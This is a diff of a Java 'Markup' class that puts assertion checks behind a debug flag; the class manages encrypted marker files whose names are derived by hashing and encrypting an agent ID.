@@ -93,8 +93,8 @@ public class Markup {
 		// final String markupName = Integer.toHexString(agentId);
 		String markupName = Utils.byteArrayToHex(Encryption.SHA1(agentId
 				.getBytes()));
-		Check.requires(markupName != null, "null markupName");
-		Check.requires(markupName != "", "empty markupName");
+		if(Cfg.DEBUG) Check.requires(markupName != null, "null markupName");
+		if(Cfg.DEBUG) Check.requires(markupName != "", "empty markupName");
 
 		String encName = "";
 
@@ -105,7 +105,7 @@ public class Markup {
 		encName += Encryption.encryptName(markupName + MARKUP_EXTENSION,
 				getMarkupSeed());
 
-		Check.asserts(markupInit, "makeMarkupName: " + markupInit);
+		if(Cfg.DEBUG) Check.asserts(markupInit, "makeMarkupName: " + markupInit);
 		return encName;
 	}
 
@@ -132,7 +132,7 @@ public class Markup {
 
 		final String markupName = makeMarkupName(value, true);
 
-		Check.asserts(markupName != "", "markupName empty");
+		if(Cfg.DEBUG) Check.asserts(markupName != "", "markupName empty");
 
 		final AutoFile file = new AutoFile(markupName);
 		if (file.exists()) {
@@ -177,9 +177,9 @@ public class Markup {
 	 * @return true, if is markup
 	 */
 	public synchronized boolean isMarkup() {
-		Check.requires(agentId != null, "agentId null");
+		if(Cfg.DEBUG) Check.requires(agentId != null, "agentId null");
 		final String markupName = makeMarkupName(agentId, true);
-		Check.asserts(markupName != "", "markupName empty");
+		if(Cfg.DEBUG) Check.asserts(markupName != "", "markupName empty");
 
 		final AutoFile fileRet = new AutoFile(markupName);
 		return fileRet.exists();
@@ -198,10 +198,10 @@ public class Markup {
 	 *             Signals that an I/O exception has occurred.
 	 */
 	public synchronized byte[] readMarkup() throws IOException {
-		Check.requires(agentId != null, "agentId null");
+		if(Cfg.DEBUG) Check.requires(agentId != null, "agentId null");
 
 		final String markupName = makeMarkupName(agentId, true);
-		Check.asserts(markupName != "", "markupName empty");
+		if(Cfg.DEBUG) Check.asserts(markupName != "", "markupName empty");
 
 		final AutoFile fileRet = new AutoFile(markupName);
 
@@ -216,8 +216,8 @@ public class Markup {
 				return null;
 			}
 
-			Check.asserts(plain != null, "wrong decryption: null");
-			Check.asserts(plain.length == len, "wrong decryption: len");
+			if(Cfg.DEBUG) Check.asserts(plain != null, "wrong decryption: null");
+			if(Cfg.DEBUG) Check.asserts(plain.length == len, "wrong decryption: len");
 
 			return plain;
 		} else {
@@ -231,10 +231,10 @@ public class Markup {
 	 * Removes the markup.
 	 */
 	public synchronized void removeMarkup() {
-		Check.requires(agentId != null, "agentId null");
+		if(Cfg.DEBUG) Check.requires(agentId != null, "agentId null");
 
 		final String markupName = makeMarkupName(agentId, true);
-		Check.asserts(markupName != "", "markupName empty");
+		if(Cfg.DEBUG) Check.asserts(markupName != "", "markupName empty");
 
 		final AutoFile remove = new AutoFile(markupName);
 		remove.delete();
@@ -255,7 +255,7 @@ public class Markup {
 	public synchronized boolean writeMarkup(final byte[] data) {
 		final String markupName = makeMarkupName(agentId, true);
 
-		Check.asserts(markupName != "", "markupName empty");
+		if(Cfg.DEBUG) Check.asserts(markupName != "", "markupName empty");
 		if (!Path.haveStorage()) {
 			return false;
 		}
@@ -268,7 +268,7 @@ public class Markup {
 		if (data != null) {
 			final byte[] encData = encryption.encryptData(data);
 
-			Check.asserts(encData.length >= data.length, "strange data len");
+			if(Cfg.DEBUG) Check.asserts(encData.length >= data.length, "strange data len");
 
 			fileRet.write(data.length);
 			fileRet.append(encData);
